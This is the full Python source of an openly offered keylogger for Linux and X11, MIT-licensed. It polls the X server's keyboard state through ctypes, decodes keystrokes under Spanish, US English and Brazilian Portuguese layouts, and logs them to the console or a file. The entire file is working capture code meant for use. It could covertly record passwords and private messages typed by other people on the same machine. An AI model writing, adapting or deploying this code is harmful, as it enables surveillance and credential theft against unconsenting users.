#!/usr/bin/env python3

"""
Kl is a simple keylogger for Linux + X11.

Requires Python 3 and xlib.

Homepage and documentation: https://github.com/surrealists/kl

License: MIT (see LICENSE for details)
"""

import ctypes
from ctypes.util import find_library
from time import sleep

__author__ = 'Cristian Cabrera'
__version__ = '4.0.0'
__license__ = 'MIT'

__all__ = [
    'Kl',
    'BaseTransformer',
    'SpanishTransformer',
    'EnglishUsaTransformer',
    'PtBrTransformer',
    'PrintHandler',
    'FileHandler',
]


# ============
# Transformers
# ============

class BaseTransformer:
    """Base for Transformer classes."""
    def __init__(self):
        self._digits = '0123456789'
        self._letters = 'abcdefghijklmnopqrstuvwxyz'

        self._command_keys = (
            'esc',
            'f1', 'f2', 'f3', 'f4', 'f5', 'f6',
            'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
            'alt',
            'backspace',
            'tab',
            'enter',
            'spacebar',
            'capslock',
            'keypad bloqnum',
            'keypad intro',
            'printscreen',
            'home',
            'up',
            'repag',
            'left',
            'right',
            'end',
            'down',
            'avpag',
            'insert',
            'delete',
            'keypad 0', 'keypad 1', 'keypad 2', 'keypad 3', 'keypad 4',
            'keypad 5', 'keypad 6', 'keypad 7', 'keypad 8', 'keypad 9',
            'keypad .', 'keypad /', 'keypad *', 'keypad -', 'keypad +',
        )

    def _only_shifts(self, modifiers):
        """Check if modifiers pressed are only shifts"""
        if not modifiers or len(modifiers) > 2:
            return False
        if len(modifiers) == 2:
            return 'left shift' in modifiers and 'right shift' in modifiers
        if len(modifiers) == 1:
            return 'left shift' in modifiers or 'right shift' in modifiers

    def _only_right_alt(self, modifiers):
        """Check if the only modifier pressed is right alt"""
        if not modifiers or len(modifiers) > 1:
            return False
        return 'right alt' in modifiers


class SpanishTransformer(BaseTransformer):
    """Transformer for Spanish keyboard layout"""
    def __init__(self):
        super().__init__()

        self._layout = {
            'no_mods': {
                ';': 'ñ',
                '`': 'º',
                '-': '\'',
                '=': '¡',
                '<': '<',
                '[': '`',
                ']': '+',
                '\'': '´',
                '\\': 'ç',
                ',': ',',
                '.': '.',
                '/': '-',
            },
            'shift': {
                ';': 'Ñ',
                '0': '=',
                '1': '!',
                '2': '"',
                '3': '·',
                '4': '$',
                '5': '%',
                '6': '&',
                '7': '/',
                '8': '(',
                '9': ')',
                '`': 'ª',
                '-': '?',
                '=': '¿',
                '<': '>',
                '[': '^',
                ']': '*',
                '\'': '¨',
                '\\': 'Ç',
                ',': ';',
                '.': ':',
                '/': '_',
                'keypad /': '<keypad />',
                'keypad *': '<keypad *>',
                'keypad intro': '<keypad intro>',
            },
            'right_alt': {
                'q': '@',
                '0': '}',
                '1': '|',
                '2': '@',
                '3': '#',
                '4': '~',
                '5': '½',
                '6': '¬',
                '7': '{',
                '8': '[',
                '9': ']',
                '`': '\\',
                '-': '\\',
                '=': '~',
                '<': '|',
                '[': '[',
                ']': ']',
                '\'': '{',
                '\\': '}',
                '.': '·',
            },
        }

    def transform(self, keys):
        """Apply Spanish layout to the pressed keys"""
        key = keys['regular'][0]
        modifiers = keys['modifiers']

        try:
            if not modifiers:
                if key in self._letters or key in self._digits:
                    res = key
                elif key in self._command_keys:
                    res = '<' + key + '>'
                else:
                    res = self._layout['no_mods'][key]
            elif self._only_shifts(modifiers):
                if key in self._letters:
                    res = key.upper()
                else:
                    res = self._layout['shift'][key]
            elif self._only_right_alt(modifiers):
                res = self._layout['right_alt'][key]
            else:
                res = None
        except KeyError:
            res = None

        return res


class PtBrTransformer(BaseTransformer):
    """Transformer for Portuguese (Brazil) keyboard layout."""
    def __init__(self):
        super().__init__()

        self._layout = {
            'no_mods': {
                ';': 'ç',
                '`': "'",
                '-': '-',
                '=': '=',
                '<': '\\',
                '[': '´',
                ']': '[',
                '\'': '~',
                '\\': ']',
                ',': ',',
                '.': '.',
                '/': ';',

            },
            'shift': {
                ';': 'Ç',
                '0': ')',
                '1': '!',
                '2': '@',
                '3': '#',
                '4': '$',
                '5': '%',
                '6': '¨',
                '7': '&',
                '8': '*',
                '9': '(',
                '`': '"',
                '-': '_',
                '=': '+',
                '<': '|',
                '[': '`',
                ']': '{',
                '\'': '^',
                '\\': '}',
                ',': '<',
                '.': '>',
                '/': ':',
                'keypad /': '<keypad />',
                'keypad *': '<keypad *>',
                'keypad intro': '<keypad intro>',
            },
            'right_alt': {
                'q': '/',
                '0': '}',
                '1': '¹',
                '2': '²',
                '3': '³',
                '4': '£',
                '5': '¢',
                '6': '¬',
                '7': '{',
                '8': '[',
                '9': ']',
                '`': '¬',
                '-': '\\',
                '=': '§',
                '<': 'º',
                '[': '´',
                ']': 'ª',
                '\'': '~',
                '\\': 'º',
                '.': '·',
            },
        }

    def transform(self, keys):
        """Apply brazilian br-abnt2 layout to the pressed keys"""
        key = keys['regular'][0]
        modifiers = keys['modifiers']

        try:
            if not modifiers:
                if key in self._letters or key in self._digits:
                    res = key
                elif key in self._command_keys:
                    res = '<' + key + '>'
                else:
                    res = self._layout['no_mods'][key]
            elif self._only_shifts(modifiers):
                if key in self._letters:
                    res = key.upper()
                else:
                    res = self._layout['shift'][key]
            elif self._only_right_alt(modifiers):
                res = self._layout['right_alt'][key]
            else:
                res = None
        except KeyError:
            res = None

        return res


class EnglishUsaTransformer(BaseTransformer):
    """Transformer for English (USA) keyboard layout."""
    def __init__(self):
        super().__init__()

        self._layout = {
            'misc': ';`-=<[]\'\\,./',
            'shift': {
                ';': ':',
                '0': ')',
                '1': '!',
                '2': '@',
                '3': '#',
                '4': '$',
                '5': '%',
                '6': '^',
                '7': '&',
                '8': '*',
                '9': '(',
                '`': '~',
                '-': '_',
                '=': '+',
                '<': '>',
                '[': '{',
                ']': '}',
                '\'': '"',
                '\\': '|',
                ',': '<',
                '.': '>',
                '/': '?',
                'keypad /': '<keypad />',
                'keypad *': '<keypad *>',
                'keypad intro': '<keypad intro>',
            },
        }

    def transform(self, keys):
        """Apply English USA layout to the pressed keys"""
        key = keys['regular'][0]
        modifiers = keys['modifiers']

        try:
            if not modifiers:
                if (key in self._letters
                        or key in self._digits
                        or key in self._layout['misc']):
                    res = key
                elif key in self._command_keys:
                    res = '<' + key + '>'
                else:
                    res = self._layout['no_mods'][key]
            elif self._only_shifts(modifiers):
                if key in self._letters:
                    res = key.upper()
                else:
                    res = self._layout['shift'][key]
            elif self._only_right_alt(modifiers):
                res = None
            else:
                res = None
        except KeyError:
            res = None

        return res


# ========
# Handlers
# ========

class PrintHandler:
    """Handler that uses the print function."""
    def handle(self, value):
        print(value)


class FileHandler:
    """Handler that writes in a file."""
    def __init__(self, stream):
        self._stream = stream

    def handle(self, value):
        self._stream.write(value + '\n')


# ============
# Core classes
# ============

class Keymap:
    """
    Keymap encapsulates the communication with the X11 library, and the
    transformation of the data structures obtained.
    """
    def __init__(self):
        self._x11 = ctypes.cdll.LoadLibrary(find_library("X11"))
        self._display = self._x11.XOpenDisplay(None)

        # This contains the keyboard state.
        # 32 bytes, with each bit representing the state for a single key.
        self._raw_keymap = (ctypes.c_char * 32)()

        self._modifiers = (
            'left shift', 'right shift',
            'left ctrl', 'right ctrl',
            'left alt', 'right alt',
            'left super', 'right super',
        )

        self._keymap_values_dict = {
            1: {
                2: 'esc',
                4: '1',
                8: '2',
                16: '3',
                32: '4',
                64: '5',
                128: '6',
            },
            2: {
                1: '7',
                2: '8',
                4: '9',
                8: '0',
                16: '-',
                32: '=',
                64: 'backspace',
                128: 'tab',
            },
            3: {
                1: 'q',
                2: 'w',
                4: 'e',
                8: 'r',
                16: 't',
                32: 'y',
                64: 'u',
                128: 'i',
            },
            4: {
                1: 'o',
                2: 'p',
                4: '[',
                8: ']',
                16: 'enter',
                32: 'left ctrl',
                64: 'a',
                128: 's',
            },
            5: {
                1: 'd',
                2: 'f',
                4: 'g',
                8: 'h',
                16: 'j',
                32: 'k',
                64: 'l',
                128: ';',
            },
            6: {
                1: '\'',
                2: '`',
                4: 'left shift',
                8: '\\',
                16: 'z',
                32: 'x',
                64: 'c',
                128: 'v',
            },
            7: {
                1: 'b',
                2: 'n',
                4: 'm',
                8: ',',
                16: '.',
                32: '/',
                64: 'right shift',
                128: 'keypad *',
            },
            8: {
                1: 'left alt',
                2: 'spacebar',
                4: 'capslock',
                8: 'f1',
                16: 'f2',
                32: 'f3',
                64: 'f4',
                128: 'f5',
            },
            9: {
                1: 'f6',
                2: 'f7',
                4: 'f8',
                8: 'f9',
                16: 'f10',
                32: 'keypad bloqnum',
                128: 'keypad 7',
            },
            10: {
                1: 'keypad 8',
                2: 'keypad 9',
                4: 'keypad -',
                8: 'keypad 4',
                16: 'keypad 5',
                64: 'keypad +',
                32: 'keypad 6',
                128: 'keypad 1',
            },
            11: {
                1: 'keypad 2',
                2: 'keypad 3',
                4: 'keypad 0',
                8: 'keypad .',
                64: '<',
                128: 'f11',
            },
            12: {
                1: 'f12',
            },
            13: {
                1: 'keypad intro',
                2: 'right ctrl',
                4: 'keypad /',
                8: 'printscreen',
                16: 'right alt',
                64: 'home',
                128: 'up',
            },
            14: {
                1: 'repag',
                2: 'left',
                4: 'right',
                8: 'end',
                16: 'down',
                32: 'avpag',
                64: 'insert',
                128: 'delete',
            },
            16: {
                32: 'left super',
                128: 'right super',
            },
        }

    def get_keymap(self):
        """Returns X11 Keymap as a list of integers"""
        self._x11.XQueryKeymap(self._display, self._raw_keymap)

        try:
            keyboard = [ord(byte) for byte in self._raw_keymap]
        except TypeError:
            return None

        return keyboard

    def get_keys(self, keymap):
        """Extract keys pressed from transformed keymap"""
        keys = dict(modifiers=[], regular=[])

        # loop on keymap bytes
        for keymap_index, keymap_byte in enumerate(keymap):
            try:
                keymap_values = self._keymap_values_dict[keymap_index]
            except KeyError:
                continue

            # loop on keymap_values for that keymap byte
            for key, value in keymap_values.items():
                if not keymap_byte & key:
                    continue
                elif value in self._modifiers:
                    keys['modifiers'].append(value)
                elif not keys['regular']:
                    keys['regular'].append(value)

        return keys


class Kl:
    """
    Kl contains the instances needed to run the main loop of the keylogger.
    """
    def __init__(self, sleep_time=.02, transformer=None,
                 handler=PrintHandler()):
        self._sleep_time = sleep_time
        self._transformer = transformer
        self._handler = handler
        self._okeymap = Keymap()
        self._last_keymap = None
        self._last_keys = dict(modifiers=[], regular=[])

    def run(self):
        """Main loop"""
        while True:
            keymap = self._okeymap.get_keymap()
            if keymap == self._last_keymap or not keymap:
                continue

            keys = self._okeymap.get_keys(keymap)
            if (keys['regular']
                    and keys['regular'] != self._last_keys['regular']):
                if self._transformer:
                    transformed_keys = self._transformer.transform(keys)
                    if transformed_keys is not None:
                        self._handler.handle(transformed_keys)
                else:
                    self._handler.handle(keys)

            self._last_keymap = keymap
            self._last_keys = keys

            sleep(self._sleep_time)


# =================
# Utility functions
# =================

def _parse_args():
    """Parse command line arguments."""
    import argparse
    parser = argparse.ArgumentParser(description='Keylogger for Linux + X11')
    arg = parser.add_argument
    arg('-s', '--sleep-time', type=float)
    arg('-t', '--transform', choices=['spanish', 'english_usa', 'pt_br'])
    arg('-f', '--file')
    arg('-l', '--line-buffering', action='store_true')
    args = parser.parse_args()
    return args


if __name__ == '__main__':
    args = _parse_args()

    if args.sleep_time:
        sleep_time = args.sleep_time
    else:
        sleep_time = .02

    if args.transform:
        if args.transform == 'english_usa':
            transformer = EnglishUsaTransformer()
        elif args.transform == 'spanish':
            transformer = SpanishTransformer()
        elif args.transform == 'pt_br':
            transformer = PtBrTransformer()
        else:
            transformer = None
    else:
        transformer = None

    if args.file:
        if args.line_buffering:
            f = open(args.file, mode='w', buffering=1)
        else:
            f = open(args.file, mode='w')
        handler = FileHandler(f)
    else:
        handler = PrintHandler()

    kl = Kl(sleep_time=sleep_time, transformer=transformer, handler=handler)
    kl.run()
